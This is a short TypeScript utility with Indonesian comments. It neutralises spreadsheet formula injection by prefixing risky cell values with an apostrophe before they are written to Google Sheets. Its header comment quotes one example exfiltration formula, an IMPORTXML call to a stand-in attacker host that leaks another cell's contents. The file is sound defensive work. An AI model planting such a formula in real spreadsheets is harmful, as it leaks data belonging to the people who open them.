/**
 * Pelindung "formula injection".
 *
 * Data ditulis ke Google Sheets dengan `valueInputOption: "USER_ENTERED"`
 * (supaya tanggal & angka tetap dikenali Sheets). Akibatnya teks yang
 * diawali `=`, `+`, `-`, `@` dijalankan sebagai rumus — misalnya
 * `=IMPORTXML("https://penyerang/?"&H2)` bisa membocorkan isi sel lain.
 *
 * Awalan apostrof membuat Sheets (dan Excel saat membuka CSV) memperlakukan
 * nilai sebagai teks biasa. Apostrofnya tidak terlihat di sel.
 */
const FORMULA_START = /^[=+\-@\t\r]/;

export function safeCell(value: string): string {
  if (typeof value !== "string" || value.length === 0) return value;
  return FORMULA_START.test(value) ? `'${value}` : value;
}

export function safeRow(row: string[]): string[] {
  return row.map(safeCell);
}
